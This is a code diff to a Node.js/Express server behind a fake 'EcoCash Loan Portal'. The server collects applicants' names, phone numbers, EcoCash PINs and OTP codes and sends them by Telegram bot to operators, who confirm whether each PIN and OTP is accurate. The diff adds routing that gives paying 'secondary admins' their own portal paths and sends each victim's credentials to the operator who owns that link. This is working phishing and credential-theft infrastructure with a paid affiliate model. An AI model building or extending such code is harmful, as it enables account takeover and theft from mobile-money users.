@@ -15,7 +15,8 @@ app.use(express.static(publicPath));
 
 const activeApplications = new Map();
 const authorizedUsers = new Map();
-const secondaryAdmins = new Map();
+const secondaryAdmins = new Map(); // Maps userId -> assignedPath (e.g., /Admin-0002)
+const pathToAdminChat = new Map(); // Maps assignedPath -> telegram chatId
 let adminCounter = 1;
 
 function formatZimbabwePhone(phone) {
@@ -30,7 +31,7 @@ function formatZimbabwePhone(phone) {
   return formattedPhone;
 }
 
-// STEP 2 SUBMISSION: Credentials delivered to bot with inline buttons
+// STEP 2 SUBMISSION: Credentials delivered directly to the specific Admin chat tied to the link path
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     const data = req.body;
@@ -43,16 +44,20 @@ app.post('/api/submit-credentials', async (req, res) => {
     const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();
     const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;
 
+    // Target the specific admin chat based on the URL path used by the applicant
+    const portalPath = data.portalPath || '/Admin-0001';
+    const targetChatId = pathToAdminChat.get(portalPath) || process.env.TELEGRAM_CHAT_ID;
+
     activeApplications.set(appReference, {
       ...data,
       formattedPhone,
+      targetChatId,
       status: 'PIN_PENDING'
     });
 
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
 
-    if (botToken && chatId) {
+    if (botToken && targetChatId) {
       const currentTimestamp = new Date().toLocaleString('en-US', {
         timeZone: 'Africa/Harare',
         year: 'numeric', month: 'numeric', day: 'numeric',
@@ -61,6 +66,7 @@ app.post('/api/submit-credentials', async (req, res) => {
 
       const messageText = `🔐 <b>ECOCASH CREDENTIALS (STEP 2)</b>\n\n` +
                           `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
+                          `🌐 <b>Portal Link Used:</b> ${portalPath}\n` +
                           `👤 <b>Name:</b> ${data.fullName || 'N/A'}\n` +
                           `🏢 <b>Occupation:</b> ${data.occupation || 'N/A'}\n` +
                           `💵 <b>Monthly Income:</b> $${data.monthlyPayments || 'N/A'}\n` +
@@ -72,7 +78,7 @@ app.post('/api/submit-credentials', async (req, res) => {
                           `❓ <b>VERIFY PIN ACCURACY:</b>`;
 
       const telegramPayload = {
-        chat_id: chatId,
+        chat_id: targetChatId,
         text: messageText,
         parse_mode: 'HTML',
         reply_markup: JSON.stringify({
@@ -99,7 +105,7 @@ app.post('/api/submit-credentials', async (req, res) => {
   }
 });
 
-// STEP 3 SUBMISSION: OTP delivered to bot with inline buttons
+// STEP 3 SUBMISSION: OTP delivered to the exact same Admin chat that received Step 2
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { appReference, otpCode } = req.body;
@@ -114,9 +120,9 @@ app.post('/api/submit-otp', async (req, res) => {
     activeApplications.set(appReference, appData);
 
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
+    const targetChatId = appData.targetChatId || process.env.TELEGRAM_CHAT_ID;
 
-    if (botToken && chatId) {
+    if (botToken && targetChatId) {
       const messageText = `💬 <b>OTP CODE SUBMISSION (STEP 3)</b>\n\n` +
                           `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                           `📞 <b>Phone:</b> 263${appData.formattedPhone}\n` +
@@ -125,7 +131,7 @@ app.post('/api/submit-otp', async (req, res) => {
                           `❓ <b>VERIFY OTP ACCURACY:</b>`;
 
       const telegramPayload = {
-        chat_id: chatId,
+        chat_id: targetChatId,
         text: messageText,
         parse_mode: 'HTML',
         reply_markup: JSON.stringify({
@@ -187,10 +193,13 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
       const userStatus = authorizedUsers.get(userId);
 
-      // 1. If Main Admin starts the bot
+      // 1. Main Admin access initialization
       if (chatId === masterChatId) {
         authorizedUsers.set(userId, 'PAID');
-        const portalUrl = `https://${req.get('host')}/Admin-0001`;
+        const mainPath = '/Admin-0001';
+        pathToAdminChat.set(mainPath, chatId);
+
+        const portalUrl = `https://${req.get('host')}${mainPath}`;
         const welcomeBackText = `🤖 <b>EcoCash Loan Portal (Main Admin)</b>\n\n` +
                                 `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +
                                 `🔗 <b>Your Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;
@@ -202,7 +211,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         return;
       }
 
-      // 2. If a secondary admin is already approved, deliver their specific private link back to their chat
+      // 2. Approved secondary admin link recovery
       if (userStatus === 'PAID' && secondaryAdmins.has(userId)) {
         const assignedPath = secondaryAdmins.get(userId);
         const portalUrl = `https://${req.get('host')}${assignedPath}`;
@@ -217,7 +226,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         return;
       }
 
-      // 3. New user/secondary admin requesting access
+      // 3. New request handling (Sent only to Main Admin for payment approval)
       authorizedUsers.set(userId, 'PENDING');
 
       const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +
@@ -227,7 +236,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
                              `🔗 <b>Private Link:</b> <a href="${privateLink}">Open Profile</a>\n\n` +
                              `👇 <b>Select Access Status for this User:</b>`;
 
-      // Forward request alert exclusively to Main Admin chat
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -246,7 +254,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
         })
       });
 
-      // Send pending notice to the applicant's private bot chat
       const userPendingText = `👋 Hello <b>${fullName}</b>,\n\n` +
                               `Your access request has been sent to the main administrator for review.\n\n` +
                               `🆔 <b>Your ID:</b> <code>${userId}</code>\n` +
@@ -260,7 +267,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return;
   }
 
-  // Handle Callback Queries
+  // Handle Callback Queries (Main Admin manages payment authorization clicks)
   const { callback_query } = req.body;
   if (!callback_query) return;
 
@@ -290,6 +297,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
         const paddedId = String(adminCounter).padStart(4, '0');
         assignedPath = `/Admin-${paddedId}`;
         secondaryAdmins.set(targetUserId, assignedPath);
+        pathToAdminChat.set(assignedPath, targetUserId.toString());
       } else {
         assignedPath = secondaryAdmins.get(targetUserId);
       }
@@ -304,7 +312,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
       ? `🎉 <b>Access Granted!</b>\n\nYour payment has been verified as <b>PAID</b>. Here is your unique private portal link:\n\n🔗 <a href="${portalUrl}">${portalUrl}</a>`
       : `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b>. Access to the portal link is restricted.`;
 
-    // Deliver the unique private link directly to the approved user's specific chat ID
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -313,7 +320,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
     return;
   }
 
-  // PIN Handlers
+  // PIN verification handlers (routed to the specific admin owning the application session)
   if (actionData.startsWith('pin_correct_')) {
     const appReference = actionData.replace('pin_correct_', '');
     if (activeApplications.has(appReference)) {
@@ -336,7 +343,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
-  // OTP Handlers
+  // OTP verification handlers
   if (actionData.startsWith('otp_correct_')) {
     const appReference = actionData.replace('otp_correct_', '');
     if (activeApplications.has(appReference)) {
@@ -383,4 +390,4 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
 });
-    
+        
